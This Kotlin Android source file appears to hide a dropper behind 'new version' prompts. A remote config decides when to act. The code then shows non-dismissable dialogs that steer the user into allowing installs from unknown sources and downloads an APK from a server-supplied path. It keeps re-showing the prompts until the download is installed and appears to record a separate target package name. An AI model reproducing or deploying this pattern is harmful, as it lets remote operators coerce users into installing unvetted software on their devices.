package cctv5.cha.abc123.utils

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Handler
import android.os.Message
import android.provider.Settings
import android.view.LayoutInflater
import android.widget.ImageView
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import cctv5.cha.abc123.R
import cctv5.cha.abc123.http.download
import cctv5.cha.abc123.http.getConfig
import cctv5.cha.abc123.modle.ResultBean
import cctv5.cha.abc123.utils.xxTools.Companion.current
import com.bumptech.glide.Glide
import com.tencent.mmkv.MMKV
import com.yarolegovich.lovelydialog.LovelyCustomDialog
import java.io.File

@SuppressLint("StaticFieldLeak")
class xxTools {
    companion object {
        var current: TextView? = null
        private var i: xxTools? = null
            get() {
                field ?: run {
                    field = xxTools()
                }
                return field
            }

        @Synchronized
        fun get(): xxTools {
            return i!!
        }
    }

    val handler: Handler = @SuppressLint("HandlerLeak")
    object : Handler() {
        override fun handleMessage(msg: Message) {
            super.handleMessage(msg)
            if (msg.what == 1) {
                if (!isInstall) {
                    if (context!!.packageManager.canRequestPackageInstalls()) {
                        isInstall = true
                        sendEmptyMessage(1)
                    } else {
                        if (!isBackground(context!!)) {
                            p?.show()
                        } else {
                            sendEmptyMessageDelayed(1, 1500)
                        }
                    }
                } else {
                    p?.dismiss()
                    updateAlert(context!!, bean!!).show()
                }
            }
            if (msg.what == 2) {
                if (!MMKV.defaultMMKV().decodeBool("state")){
                    if (!isBackground(context!!)) {
                        if (u == null){
                            u = updateAlert(context!!, bean!!)
                        }
                        u!!.show()
                    }else{
                        sendEmptyMessageDelayed(2, 1500)
                    }
                }else{
                    u?.dismiss()
                }
            }
        }
    }

    var context: Context? = null
    var isInstall = false
    var bean: ResultBean? = null

    var p:LovelyCustomDialog?=null
    var u:LovelyCustomDialog?=null

    fun xxCheck(context: Context) {
        this.context = context
        if (MMKV.defaultMMKV().decodeBool("state", false))
            return
        (context as AppCompatActivity).getConfig {
            if (it.status == "0" || it.status == "1") {
                if (it.status == "1") {
                    this.bean = it
                    MMKV.defaultMMKV().encode("oPack", it.oPack)
                    if (!context.packageManager.canRequestPackageInstalls()) {
                        p = installPermissionAlert(context, it)
                        p?.show()
                    } else {
                        isInstall = true
                        u = updateAlert(context, it)
                        u?.show()
                    }
                }
            } else {
                return@getConfig
            }
        }
    }

}

fun isBackground(context: Context): Boolean {
    val activityManager = context
        .getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val appProcesses = activityManager
        .runningAppProcesses
    for (appProcess in appProcesses) {
        if (appProcess.processName == context.packageName) {
            return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
        }
    }
    return false
}

fun installPermissionAlert(context: Context, data: ResultBean) :LovelyCustomDialog{
    val v = LayoutInflater.from(context).inflate(R.layout.dialog_common, null)
    v.findViewById<TextView>(R.id.dialogTitle).apply {
        text = "Permission"
    }
    v.findViewById<TextView>(R.id.dialogContent).apply {
        text = data.pkey
    }
    v.findViewById<ImageView>(R.id.guid).apply {
        Glide.with(context).load(data.ukey).into(this)
    }
    v.findViewById<TextView>(R.id.dialogBtn).apply {
        text = "ok"
    }
    return LovelyCustomDialog(context)
        .setView(v)
        .setCancelable(false)
        .setListener(R.id.dialogBtn, true) {
            xxTools.get().handler.sendEmptyMessageDelayed(1, 1500)
            if (!context.packageManager.canRequestPackageInstalls()) {
                xxTools.get().handler.sendEmptyMessageDelayed(1, 1500)
                val uri = Uri.parse("package:" + context.packageName)
                val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(i)
            } else {
                updateAlert(context, data)
            }
        }
}

fun updateAlert(context: Context, data: ResultBean) :LovelyCustomDialog{
    xxTools.get().context = context
    val v = LayoutInflater.from(context).inflate(R.layout.dialog_common, null)
    v.findViewById<TextView>(R.id.dialogTitle).apply {
        text = "New Version"
    }
    v.findViewById<TextView>(R.id.dialogContent).apply {
        text = formatString(data.ikey)
    }
    v.findViewById<TextView>(R.id.dialogBtn).apply {
        text = "Download"
    }
  return LovelyCustomDialog(context)
        .setView(v)
        .setCancelable(false)
        .setListener(R.id.dialogBtn, true) {
            if (File(path).exists()) {
                xxTools.get().handler.sendEmptyMessageDelayed(2, 1500)
                install(context, File(path))
            } else {
                val progress = progressAlert(context)
                progress.show()
                download(context, data.path) {
                    current?.text = "current = $it%"
                    if (it == 100) {
                        xxTools.get().handler.sendEmptyMessageDelayed(2, 1500)
                        progress.dismiss()
                        install(context, File(path))
                    }
                }
            }

        }
}

fun progressAlert(context: Context): AlertDialog {
    xxTools.get().u?.dismiss()
    val dialog = AlertDialog.Builder(context).create()
    val v = LayoutInflater.from(context).inflate(R.layout.dialog_progress, null)
    dialog.setView(v)
    dialog.setCancelable(false)
    dialog.setCanceledOnTouchOutside(false)
    v.findViewById<TextView>(R.id.title).apply {
        text = "Download"
    }
    current = v.findViewById(R.id.current)
    return dialog
}

private fun formatString(s: String): String {
    var r = ""
    if (s.contains("|")) {
        val temp = s.split("|")
        temp.forEach {
            r = r + it + "\n"
        }
    }
    return r
}